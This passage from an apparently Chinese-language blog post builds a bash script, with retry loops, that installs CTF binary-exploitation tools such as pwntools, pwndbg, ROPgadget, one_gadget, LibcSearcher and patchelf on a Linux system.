class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 必要的安装</span></span><br><span class=\"line\">apt-get update</span><br><span class=\"line\">apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class=\"line\"><span class=\"comment\"># 安装常用工具</span></span><br><span class=\"line\">sudo apt install -y git vim gdb strace ltrace  socat netcat</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装pwntools</span></span><br><span class=\"line\">python3 -m pip install --upgrade pip</span><br><span class=\"line\">python3 -m pip install --upgrade pwntools</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装pwndbg</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class=\"line\"><span class=\"built_in\">cd</span> pwndbg</span><br><span class=\"line\">sudo ./setup.sh</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;source /ctfpwntools/pwndbg/gdbinit.py&quot;</span> &gt;&gt; ~/.gdbinit</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ..</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装glibc-all-in-one</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> glibc-all-in-one/</span><br><span class=\"line\">python3 update_list</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ..</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装ROPgadget</span></span><br><span class=\"line\">pip install capstone</span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ROPgadget</span><br><span class=\"line\">sudo python3 setup.py install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># one_gadget</span></span><br><span class=\"line\">apt -y install ruby</span><br><span class=\"line\">gem install one_gadget </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># LibcSearcher</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/lieanu/LibcSearcher.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> LibcSearcher</span><br><span class=\"line\">python3 setup.py develop</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ..</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># patchelf</span></span><br><span class=\"line\">apt-get install autoconf automake libtool</span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/NixOS/patchelf.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> patchelf</span><br><span class=\"line\">./bootstrap.sh </span><br><span class=\"line\">./configure</span><br><span class=\"line\">make</span><br><span class=\"line\">make check</span><br><span class=\"line\">make install</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ..</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">##  seccomp</span></span><br><span class=\"line\"><span class=\"comment\"># 1.添加仓库</span></span><br><span class=\"line\">  sudo add-apt-repository ppa:brightbox/ruby-ng</span><br><span class=\"line\">  sudo apt-get update</span><br><span class=\"line\"><span class=\"comment\"># 2.指定安装 ruby 2.6 版本</span></span><br><span class=\"line\">  sudo apt-get install ruby2.6 ruby2.6-dev </span><br><span class=\"line\"><span class=\"comment\"># 3.然后安装 seccomp-tools</span></span><br><span class=\"line\">  sudo gem install seccomp-tools</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 32位libc</span></span><br><span class=\"line\">dpkg --add-architecture i386</span><br><span class=\"line\">apt-get install libc6:i386</span><br><span class=\"line\">apt-get install libgtk2.0-0:i386</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"简单的开始\"><a href=\"#简单的开始\" class=\"headerlink\" title=\"简单的开始\"></a>简单的开始</h2><p>​\t\t简单的创建while循环,指定安装次数</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#! /bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> /ctfpwntools</span><br><span class=\"line\"><span class=\"built_in\">cd</span> /ctfpwntools</span><br><span class=\"line\"></span><br><span class=\"line\">MAX_RETRIES=3</span><br><span class=\"line\">INSTALL_SUCCESS=<span class=\"literal\">false</span></span><br><span class=\"line\">RETRY_COUNT=0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 更新apt源</span></span><br><span class=\"line\">sudo apt update</span><br><span class=\"line\"><span class=\"comment\"># 安装常用工具</span></span><br><span class=\"line\">sudo apt install -y git vim gdb strace ltrace nmap socat netcat</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装pwntools</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> [ <span class=\"variable\">$RETRY_COUNT</span> -lt <span class=\"variable\">$MAX_RETRIES</span> ] &amp;&amp; [ <span class=\"string\">&quot;<span class=\"variable\">$INSTALL_SUCCESS</span>&quot;</span> = <span class=\"literal\">false</span> ]</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Attempt <span class=\"subst\">$((RETRY_COUNT+1)</span>) to install pwntools...&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    apt-get install -y python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class=\"line\">    python3 -m pip install --upgrade pip</span><br><span class=\"line\">    python3 -m pip install --upgrade pwntools</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 检查安装是否成功</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> [ $? -eq 0 ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">        INSTALL_SUCCESS=<span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        RETRY_COUNT=$((RETRY_COUNT+<span class=\"number\">1</span>))</span><br><span class=\"line\">    <span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"string\">&quot;<span class=\"variable\">$INSTALL_SUCCESS</span>&quot;</span> = <span class=\"literal\">true</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;pwntools installed successfully!&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Failed to install pwntools after <span class=\"variable\">$MAX_RETRIES</span> attempts.&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\">MAX_RETRIES=3</span><br><span class=\"line\">INSTALL_SUCCESS=<span class=\"literal\">false</span></span><br><span class=\"line\">RETRY_COUNT=0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装pwndbg</span></span><br><span class=\"line\"><span class=\"keyword\">while</span>....</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"另外一种方式\"><a href=\"#另外一种方式\" class=\"headerlink\" title=\"另外一种方式\"></a>另外一种方式</h2><p>​\t\t只需要定义一个变量, 而且代码量少了很多</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义变量</span></span><br><span class=\"line\">MAX_RETRY=3</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 更新apt源</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> sudo apt update; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;更新apt源时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;更新apt源失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装常用工具</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> xxxxxxxxxxx; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装常用工具时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装常用工具失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"定好模版\"><a href=\"#定好模版\" class=\"headerlink\" title=\"定好模版\"></a>定好模版</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义变量</span></span><br><span class=\"line\">MAX_RETRY=3</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装常用工具</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> xxxxxxxxxxx; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装常用工具时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装常用工具失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"套上\"><a href=\"#套上\" class=\"headerlink\" title=\"套上!\"></a>套上!</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#! /bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> /ctfpwntools</span><br><span class=\"line\"><span class=\"built_in\">cd</span> /ctfpwntools</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义变量</span></span><br><span class=\"line\">MAX_RETRY=3</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 必要的更新、安装常用工具</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (apt-get update;apt-get -y install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential git vim gdb strace ltrace  socat netcat); <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;更新、安装常用工具时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;更新、安装常用工具失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装pwntools</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (python3 -m pip install --upgrade pip;python3 -m pip install --upgrade pwntools); <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装pwntools时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装pwntools失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装pwndbg</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (git <span class=\"built_in\">clone</span> https://github.com/pwndbg/pwndbg;<span class=\"built_in\">cd</span> pwndbg;./setup.sh;<span class=\"built_in\">echo</span> <span class=\"string\">&quot;source /ctfpwntools/pwndbg/gdbinit.py&quot;</span> &gt;&gt; ~/.gdbinit;<span class=\"built_in\">cd</span> ..); <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装pwndbg时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装pwndbg失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装glibc-all-in-one</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (git <span class=\"built_in\">clone</span> https://github.com/matrix1001/glibc-all-in-one.git;<span class=\"built_in\">cd</span> glibc-all-in-one/;python3 update_list;<span class=\"built_in\">cd</span> ..); <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装glibc-all-in-one时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装glibc-all-in-one失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装ROPgadget</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (pip install capstone;git <span class=\"built_in\">clone</span> https://github.com/JonathanSalwan/ROPgadget.git;<span class=\"built_in\">cd</span> ROPgadget;sudo python3 setup.py install;<span class=\"built_in\">cd</span> ..); <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装ROPgadget时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装ROPgadget失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># one_gadget</span></span><br><span class=\"line\"><span class=\"comment\"># 32位libc</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (apt -y install ruby;gem install one_gadget;dpkg --add-architecture i386;apt-get -y install libc6:i386 libgtk2.0-0:i386); <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装one_gadget时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装one_gadget失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># LibcSearcher</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (git <span class=\"built_in\">clone</span> https://github.com/lieanu/LibcSearcher.git;<span class=\"built_in\">cd</span> LibcSearcher;python3 setup.py develop;<span class=\"built_in\">cd</span> ..); <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装LibcSearcher时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装LibcSearcher失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># patchelf</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (apt-get install autoconf automake libtool;git <span class=\"built_in\">clone</span> https://github.com/NixOS/patchelf.git;<span class=\"built_in\">cd</span> patchelf;./bootstrap.sh;./configure;make;make check;make install;<span class=\"built_in\">cd</span> ..); <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> 